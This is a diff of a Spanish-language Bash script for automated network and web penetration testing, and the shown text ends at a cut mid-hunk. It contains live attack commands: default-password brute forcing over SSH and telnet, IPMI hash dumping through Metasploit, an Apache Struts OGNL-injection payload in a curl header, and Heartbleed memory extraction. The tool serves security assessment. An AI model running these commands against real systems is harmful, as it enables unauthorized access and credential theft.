@@ -2,12 +2,13 @@
 # Author: Daniel Torres
 # daniel.torres@owasp.org
 ##
-# Identificar backdoors (archivos conocidos, expresiones regulares)
-# Adicionar struts check
-# cracker.sh admin/admin  wordpress,joomla,drupal
+# cracker.sh admin/admin
 # PoC Suite3
 # https://medium.com/tenable-techblog/gpon-home-gateway-rce-threatens-tens-of-thousands-users-c4a17fd25b97
 # Identificar redes con  http://www.ip-calc.com/
+# https://github.com/Exploit-install/Routerhunter-2.0
+# Sacar herramientas de https://github.com/1N3/Sn1per https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest https://github.com/skavngr/rapidscan
+# sslscan -h
 ##
 
 OKBLUE='\033[94m'
@@ -833,7 +834,7 @@ if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then
 		
 	
 	grep "1604/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1604\n"' >> ../.servicios/citrix.txt	
-	grep "1900/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1900\n"' >> ../.servicios/upnp.txt	
+	grep "1900/open/" nmap-udp.grep | awk '{print $2}' >> ../.servicios/upnp.txt	
 	grep "623/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:623\n"' >> ../.servicios/IPMI.txt
 		
 	cd ../
@@ -925,32 +926,29 @@ then
 		#,smb-vuln-ms10-061,,smb-vuln-ms06-025,smb-vuln-ms07-029 		
 		echo "nmap -n -p445 --script smb-vuln-ms08-067 $ip" >> logs/vulnerabilidades/$ip-445-ms08067.txt 2>/dev/null
 		nmap -n -p445 --script smb-vuln-ms08-067 $ip >> logs/vulnerabilidades/$ip-445-ms08067.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-445-ms08067.txt | egrep -v "ACCESS_DENIED|false" > .vulnerabilidades/$ip-445-ms08067.txt  		
+		grep "|" logs/vulnerabilidades/$ip-445-ms08067.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-445-ms08067.txt  		
 		
 		echo "nmap -n -p445 --script smb-vuln-ms17-010 $ip" > logs/vulnerabilidades/$ip-445-ms17010.txt 2>/dev/null
 		nmap -n -p445 --script smb-vuln-ms17-010 $ip >> logs/vulnerabilidades/$ip-445-ms17010.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-445-ms17010.txt | egrep -v "ACCESS_DENIED|false|Could" > .vulnerabilidades/$ip-445-ms17010.txt  
+		grep "|" logs/vulnerabilidades/$ip-445-ms17010.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-445-ms17010.txt  
 		
 		echo "nmap -n -p445 --script smb-double-pulsar-backdoor $ip" > logs/vulnerabilidades/$ip-445-doublepulsar.txt 2>/dev/null
 		nmap -n -p445 --script smb-double-pulsar-backdoor $ip >> logs/vulnerabilidades/$ip-445-doublepulsar.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-445-doublepulsar.txt | egrep -v "ACCESS_DENIED|false|Could" > .vulnerabilidades/$ip-445-doublepulsar.txt  
+		grep "|" logs/vulnerabilidades/$ip-445-doublepulsar.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-445-doublepulsar.txt  
 		
 		echo "nmap -n -p445 --script smb-vuln-conficker $ip" > logs/vulnerabilidades/$ip-445-conficker.txt 2>/dev/null
 		nmap -n -p445 --script smb-vuln-conficker $ip >> logs/vulnerabilidades/$ip-445-conficker.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-445-conficker.txt | egrep -v "ACCESS_DENIED|false|Could" > .vulnerabilidades/$ip-445-conficker.txt  							
+		grep "|" logs/vulnerabilidades/$ip-445-conficker.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-445-conficker.txt  							
 		
-		echo "smbmap -H $ip -u anonymous -p anonymous" > logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
-		smbmap -H $ip -u anonymous -p anonymous >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
-		egrep --color=never "READ|WRITE" logs/vulnerabilidades/$ip-445-compartido.txt > .vulnerabilidades/$ip-445-compartido2.txt
-		echo ""  >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
+		echo "smbmap -H $ip -u anonymous -p anonymous" > logs/vulnerabilidades/$ip-445-compartidoSMB.txt 2>/dev/null
+		smbmap -H $ip -u anonymous -p anonymous >> logs/vulnerabilidades/$ip-445-compartidoSMB.txt 2>/dev/null		
+		echo ""  >> logs/vulnerabilidades/$ip-445-compartidoSMB.txt 2>/dev/null
 		
-		echo "smbmap -H $ip"  >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
-		smbmap -H $ip  >> logs/vulnerabilidades/$ip-445-compartido.txt 2>/dev/null
-		egrep --color=never "READ|WRITE" logs/vulnerabilidades/$ip-445-compartido.txt >> .vulnerabilidades/$ip-445-compartido2.txt
+		echo "smbmap -H $ip"  >> logs/vulnerabilidades/$ip-445-compartidoSMB.txt 2>/dev/null
+		smbmap -H $ip  >> logs/vulnerabilidades/$ip-445-compartidoSMB.txt 2>/dev/null
 		
-		sort .vulnerabilidades/$ip-445-compartido2.txt | uniq | grep -v "\$"> .vulnerabilidades/$ip-445-compartidoSMB.txt
-		rm .vulnerabilidades/$ip-445-compartido2.txt
-			
+		egrep --color=never "READ|WRITE" logs/vulnerabilidades/$ip-445-compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/$ip-445-compartidoSMB.txt
+		
 		########## making reportes #######
 		echo -e "[+] Obteniendo OS/dominio" 		
 		cp $live_hosts .smbinfo/
@@ -971,7 +969,7 @@ fi
 grep -i windows reportes/reporte-OS.txt 2> /dev/null | cut -d ";" -f 1 >> .servicios/Windows.txt
 
 # servers
-egrep -i "server|unix" reportes/reporte-OS.txt 2>/dev/null | cut -d ";" -f1 >> .servicios/servers2.txt
+egrep -i "server|unix|Samba" reportes/reporte-OS.txt 2>/dev/null | cut -d ";" -f1 >> .servicios/servers2.txt
 cat .servicios/ldap.txt 2>/dev/null | cut -d ":" -f1 >> .servicios/servers2.txt 2>/dev/null 
 sort .servicios/servers2.txt | uniq > .servicios/servers.txt
 rm .servicios/servers2.txt
@@ -1039,9 +1037,13 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		echo -e "[+] Escaneando $ip"
+		echo -e "\t[+] Probando vulnerabilidad cipher-zero"
 		echo "nmap -sU --script ipmi-version -p 623 -Pn -n $ip"  > logs/vulnerabilidades/$ip-IPMI-vuln.txt 2>/dev/null 
-		nmap -sU --script ipmi-version -p 623 -Pn -n $ip >> logs/vulnerabilidades/$ip-IPMI-vuln.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/$ip-IPMI-vuln.txt > .vulnerabilidades/$ip-IPMI-vuln.txt 								
+		nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip >> logs/vulnerabilidades/$ip-IPMI-cipherZero.txt 2>/dev/null 
+		grep "|" logs/vulnerabilidades/$ip-IPMI-cipherZero.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-IPMI-cipherZero.txt 	
+		echo -e "\t[+] Probando si se puede extraer hashes"
+		msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/$ip-$port-dumphashes.txt 2>/dev/null		
+		egrep --color=never -i "Hash found" logs/vulnerabilidades/$ip-$port-dumphashes.txt  > .vulnerabilidades/$ip-$port-dumphashes.txt 							
 	done
 	
 	#insert clean data	
@@ -1057,7 +1059,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "nmap -n -sV -p $port -Pn --script=mongodb-databases $ip"  > logs/vulnerabilidades/$ip-mongodb-databases.txt 2>/dev/null 
 		nmap -n -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/$ip-mongodb-databases.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/$ip-mongodb-databases.txt | egrep -v "ERROR" > .vulnerabilidades/$ip-mongodb-databases.txt 				
+		grep "|" logs/vulnerabilidades/$ip-mongodb-databases.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-mongodb-databases.txt 				
 	done
 	
 	#insert clean data	
@@ -1074,7 +1076,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "nmap -Pn -n -sV -p $port --script=couchdb-databases $ip" >> logs/vulnerabilidades/$ip-couchdb-databases.txt 2>/dev/null
 		nmap -Pn -n -sV -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/$ip-couchdb-databases.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-couchdb-databases.txt > .vulnerabilidades/$ip-couchdb-databases.txt 
+		grep "|" logs/vulnerabilidades/$ip-couchdb-databases.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-couchdb-databases.txt 
 	done
 	
 	#insert clean data	
@@ -1092,7 +1094,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "nmap -Pn -n $ip --script=x11-access.nse" > logs/vulnerabilidades/$ip-x11-access.txt 2>/dev/null 
 		nmap -Pn -n $ip --script=x11-access.nse >> logs/vulnerabilidades/$ip-x11-access.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/$ip-x11-access.txt | grep -v ERROR > .vulnerabilidades/$ip-x11-access.txt 
+		grep "|" logs/vulnerabilidades/$ip-x11-access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-x11-access.txt 
 	done	
 	
 	#insert clean data	
@@ -1107,12 +1109,12 @@ then
 		port=`echo $line | cut -f2 -d":"`	
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "nmap -n -p $port $ip --script=nfs-ls.nse" > logs/vulnerabilidades/$ip-rpc-nfs.txt 2>/dev/null 
-		nmap -Pn -n -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/$ip-rpc-nfs.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/$ip-rpc-nfs.txt > .vulnerabilidades/$ip-rpc-nfs.txt 
+		nmap -Pn -n -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/$ip-rpc-compartidoNFS.txt 2>/dev/null 
+		grep "|" logs/vulnerabilidades/$ip-rpc-compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-rpc-compartidoNFS.txt 
 		
 		echo "nmap -n -p $port $ip --script=rpcinfo" > logs/enumeracion/$ip-rpc-info.txt 2>/dev/null 
 		nmap -Pn -n -p $port $ip --script=rpcinfo >> logs/enumeracion/$ip-rpc-info.txt 2>/dev/null 
-		grep "|" logs/enumeracion/$ip-rpc-info.txt > .enumeracion/$ip-rpc-info.txt
+		grep "|" logs/enumeracion/$ip-rpc-info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/$ip-rpc-info.txt
 		
 	done	
 	
@@ -1157,7 +1159,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"			
 		echo "nmap -n -p $port $ip --script redis-info" > logs/enumeracion/$ip-redis.txt 2>/dev/null
 		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/$ip-redis.txt 2>/dev/null
-		grep "|" logs/enumeracion/$ip-redis.txt  > .enumeracion/$ip-redis.txt						
+		grep "|" logs/enumeracion/$ip-redis.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR"  > .enumeracion/$ip-redis.txt						
 	done
 	
 	#insert clean data	
@@ -1173,7 +1175,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "nmap -n -p $port $ip --script rmi-vuln-classloader" > logs/vulnerabilidades/$ip-rmi-vuln.txt 2>/dev/null
 		nmap -Pn -n -p $port $ip --script rmi-vuln-classloader >> logs/vulnerabilidades/$ip-rmi-vuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-rmi-vuln.txt  | egrep -v "ERROR" > .vulnerabilidades/$ip-rmi-vuln.txt
+		grep "|" logs/vulnerabilidades/$ip-rmi-vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-rmi-vuln.txt
 		
 	done
 	
@@ -1193,7 +1195,16 @@ then
 		
 		echo -e "\t[+] Obteniendo banner"	
 		echo -e "\tquit" | nc -w 4 $ip $port | strings > .enumeracion/$ip-$port-banner.txt 2>/dev/null				
-
+		
+		echo -e "\t[+] Probando passwords"	
+		medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u admin -e n -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -p solokey -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -e n-M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+		
+		
+		grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-passwordDefecto.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
 		 echo ""
  	done <.servicios/telnet.txt
 		
@@ -1213,13 +1224,21 @@ then
 		echo -e "\tquit" | nc -w 4 $ip $port | strings | uniq> .enumeracion/$ip-$port-banner.txt 2>/dev/null
 		#SSHBypass
 		grep --color=never "libssh" .enumeracion/$ip-$port-banner.txt > .vulnerabilidades/$ip-$port-SSHBypass.txt 
-				
-		 echo ""
+		
+		echo -e "\t[+] Probando passwords"	
+		medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u admin -e n -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -e n-M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+		
+		grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null					
+		echo ""
  	done <.servicios/ssh.txt
 		
 	#insert clean data	
 	insert_data
 fi # ssh
+
 
 
 
@@ -1290,7 +1309,7 @@ then
 		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
 		echo "nmap -n -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/$ip-$port-VNCbypass.txt 2>/dev/null
 		nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/$ip-$port-VNCbypass.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-$port-VNCbypass.txt > .vulnerabilidades/$ip-$port-VNCbypass.txt
+		grep "|" logs/vulnerabilidades/$ip-$port-VNCbypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-$port-VNCbypass.txt
 	done
 	
 	#insert clean data	
@@ -1309,7 +1328,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"	
 		echo -e "\t[+] Obteniendo información de MS-SQL"
 		nmap -sU -n -sV -p 1434 --host-timeout 10s --script ms-sql-info $ip > logs/enumeracion/$ip-1434-info.txt  2>/dev/null
-		grep "|" logs/enumeracion/$ip-1434-info.txt  > .enumeracion/$ip-1434-info.txt 
+		grep "|" logs/enumeracion/$ip-1434-info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/$ip-1434-info.txt 
 					
 		 echo ""
  	done <.servicios/mssql.txt
@@ -1378,8 +1397,8 @@ then
 		nmap -n -sU --script=citrix-enum-apps -p 1604 $ip > logs/enumeracion/$ip-citrix-app.txt 2>/dev/null
 		nmap -n -sU --script=citrix-enum-servers -p 1604  $ip > logs/enumeracion/$ip-citrix-servers.txt 2>/dev/null
 		
-		grep "|" logs/enumeracion/$ip-citrix-app.txt | egrep -v "ERROR|filtered" > .enumeracion/$ip-citrix-app.txt 
-		grep "|" logs/enumeracion/$ip-citrix-servers.txt | egrep -v "ERROR|filtered" > .enumeracion/$ip-citrix-servers.txt 
+		grep "|" logs/enumeracion/$ip-citrix-app.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/$ip-citrix-app.txt 
+		grep "|" logs/enumeracion/$ip-citrix-servers.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/$ip-citrix-servers.txt 
 													 
 		 echo ""
  	done <.servicios/citrix.txt
@@ -1433,7 +1452,7 @@ then
 		echo -e "\t[+] Probando enumeracion de elasticsearch"		
 		msfconsole -x "use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit" > logs/vulnerabilidades/$ip-elasticsearch-vuln.txt 2>/dev/null
 		grep --color=never "Indices found" logs/vulnerabilidades/$ip-elasticsearch-vuln.txt  > .vulnerabilidades/$ip-elasticsearch-vuln.txt 
-																		
+	    #exploit/multi/elasticsearch/search_groovy_script 																	
 		 echo ""
  	done <.servicios/elasticsearch.txt
 				
@@ -1474,7 +1493,7 @@ then
 		echo -e "\t[+] Probando vulnerabilidad"				
 		echo "nmap -n -p 16992 --script http-vuln-cve2017-5689 $ip" > logs/vulnerabilidades/$ip-intel-bypass.txt 2>/dev/null
 		nmap -n -p 16992 --script http-vuln-cve2017-5689 $ip >> logs/vulnerabilidades/$ip-intel-bypass.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-intel-bypass.txt > .vulnerabilidades/$ip-intel-bypass.txt
+		grep "|" logs/vulnerabilidades/$ip-intel-bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$ip-intel-bypass.txt
 													 
 		 echo ""
  	done <.servicios/intel.txt	
@@ -1681,9 +1700,9 @@ then
 								
 																
 								echo -e "\t[+] Revisando vulnerabilidad slowloris ($subdominio)"
-								echo "nmap --script http-slowloris-check -p $port $subdominio" > logs/vulnerabilidades/$subdominio-$port-slowloris.txt 2>/dev/null 
+								echo "nmap --script http-slowloris-check -p $port $subdominio" > logs/vulnerabilidades/$subdominio-$port-slowloris.txt 2>/dev/null
 								nmap --script http-slowloris-check -p $port $subdominio >> logs/vulnerabilidades/$subdominio-$port-slowloris.txt 2>/dev/null
-								grep "|" logs/vulnerabilidades/$ip-$port-slowloris.txt > .vulnerabilidades/$subdominio-$port-slowloris.txt  																		
+								grep "|" logs/vulnerabilidades/$subdominio-$port-slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/$subdominio-$port-slowloris.txt
 							fi						
 							####################################	
 							
@@ -1715,7 +1734,8 @@ then
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
 								
 								echo -e "\t[+] Revisando Apache Struts"
-								curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$subdominio:$port/" > .vulnerabilidades/$subdominio-$port-apacheStruts.txt 2>/dev/null
+								curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$subdominio:$port/" > logs/vulnerabilidades/$subdominio-$port-apacheStruts.txt 2>/dev/null
+								grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/$subdominio-$port-apacheStruts.txt > .vulnerabilidades/$subdominio-$port-apacheStruts.txt
 						  		  
 								echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
 								web-buster.pl -t $subdominio -p $port -h 5 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
@@ -1758,7 +1778,7 @@ then
 							#######  clone site (domain) ####### 									
 							cd webClone
 								echo -e "\t\t[+] Clonando sitio ($subdominio)"	
-								wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp --exclude-directories /calendar,/noticias,/xnoticias --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio
+								wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio
 								rm index.html.orig 2>/dev/null
 							cd ..										
 							###################################							
@@ -1872,7 +1892,7 @@ then
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
 				   #nmap -n -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
 					nmap -n -p $port --script=http-iis-webdav-vuln $ip > logs/vulnerabilidades/$ip-$port-webdav.txt 2>/dev/null 
-					grep "|" logs/vulnerabilidades/$ip-$port-webdav.txt | grep -v "WebDAV is DISABLED" > .vulnerabilidades/$ip-$port-webdav.txt 					
+					grep "|" logs/vulnerabilidades/$ip-$port-webdav.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-$port-webdav.txt 					
 					echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
 					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
@@ -2151,7 +2171,7 @@ then
 							greprc=$?
 							if [[ $greprc -eq 0 ]] ; then						
 								echo -e "\t\ŧ$OKRED[!] Vulnerable a heartbleed \n $RESET"
-								grep "|" logs/vulnerabilidades/$subdominio-$port-heartbleed.txt > .vulnerabilidades/$subdominio-$port-heartbleed.txt				
+								grep "|" logs/vulnerabilidades/$subdominio-$port-heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$subdominio-$port-heartbleed.txt				
 								heartbleed.py $subdominio -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/$subdominio-$port-heartbleedRAM.txt						
 							else							
 								echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
@@ -2165,7 +2185,7 @@ then
 								if [ -d "$subdominio" ]; then
 									echo -e "\t\t[+] Ya clonamos este sitio"
 								else
-									wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp --exclude-directories /calendar,/noticias,/xnoticias --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate https://$subdominio
+									wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate https://$subdominio
 									rm index.html.orig 2>/dev/null
 								fi
 								
@@ -2208,7 +2228,7 @@ then
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then						
 					echo -e "\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
-					grep "|" logs/vulnerabilidades/$ip-$port-heartbleed.txt > .vulnerabilidades/$ip-$port-heartbleed.txt				
+					grep "|" logs/vulnerabilidades/$ip-$port-heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-$port-heartbleed.txt				
 					heartbleed.py $ip -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/$ip-$port-heartbleedRAM.txt						
 				else
 					echo -e "\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
@@ -2272,7 +2292,7 @@ then
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes					
 					echo -e "\n### $ip:$port ( IIS - HTTPsys)"
 					nmap -n -Pn -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
-					grep "|" logs/vulnerabilidades/$ip-$port-HTTPsys.txt > .vulnerabilidades/$ip-$port-HTTPsys.txt 
+					grep "|" logs/vulnerabilidades/$ip-$port-HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-$port-HTTPsys.txt 
 					
 					echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
 					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
@@ -2379,7 +2399,7 @@ then
 			
 			echo -e "\t[+] Revisando vulnerabilidad MS12-020"
 			nmap -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/$ip-3389-ms12020.txt
-			grep "|" logs/vulnerabilidades/$ip-3389-ms12020.txt > .vulnerabilidades/$ip-3389-ms12020.txt
+			grep "|" logs/vulnerabilidades/$ip-3389-ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-3389-ms12020.txt
 			
 			while true; do
 				free_ram=`free -m | grep -i mem | awk '{print $7}'`
@@ -2514,13 +2534,13 @@ then
 				
 			echo "nmap -sV -p80 --script http-shellshock.nse --script-args uri=$path $ip" > logs/vulnerabilidades/$ip-80-shellshock.txt
 			nmap -sV -p80 --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/$ip-80-shellshock.txt
-			grep "|" logs/vulnerabilidades/$ip-80-shellshock.txt  > .vulnerabilidades/$ip-80-shellshock.txt	
+			grep "|" logs/vulnerabilidades/$ip-80-shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-80-shellshock.txt	
 			
 			if [ -s .vulnerabilidades/$ip-80-shellshock.txt ] # if FILE exists and has a size greater than zero.
 			then
 				echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
 				echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/$ip-80-shellshock.txt
-				grep "|" logs/vulnerabilidades/$ip-80-shellshock.txt  >> .vulnerabilidades/$ip-80-shellshock.txt	
+				grep "|" logs/vulnerabilidades/$ip-80-shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" >> .vulnerabilidades/$ip-80-shellshock.txt	
 			else				
 				echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
 			fi
@@ -2544,7 +2564,7 @@ then
 				echo -e "\t [+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"		
 				echo "nmap -sV -p443 --script http-shellshock.nse --script-args uri=$path $ip" > logs/vulnerabilidades/$ip-443-shellshock.txt
 				nmap -sV -p443 --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/$ip-443-shellshock.txt
-				grep "|" logs/vulnerabilidades/$ip-443-shellshock.txt  > .vulnerabilidades/$ip-443-shellshock.txt			
+				grep "|" logs/vulnerabilidades/$ip-443-shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-443-shellshock.txt			
 			fi			
 		done		
 	
@@ -2562,28 +2582,8 @@ then
 		echo -e "[+] Escaneando $ip:$port"	
 		echo -e "\t [+] Probando transferencia de zona"
 			
-		#resolve IP - dominio
-		dominio=`dig -x $ip @$ip| egrep "PTR|SOA" | egrep -iv ";|adsl|mobile|static|host-|LACNIC|tld" | head -1 | awk '{print $5}'`
-		
-		if [[ ${dominio} != "" && ${dominio} != *"local"*  && ${dominio} != *"arpa"*  ]];then
-			#remove subdominio
-			set -- "$dominio" 
-			IFS="."; declare -a Array=($*) 	
-			array_len=${#Array[@]}
-			IFS=" ";
-			sub2=${Array[$array_len - 2]} # dominio ó com
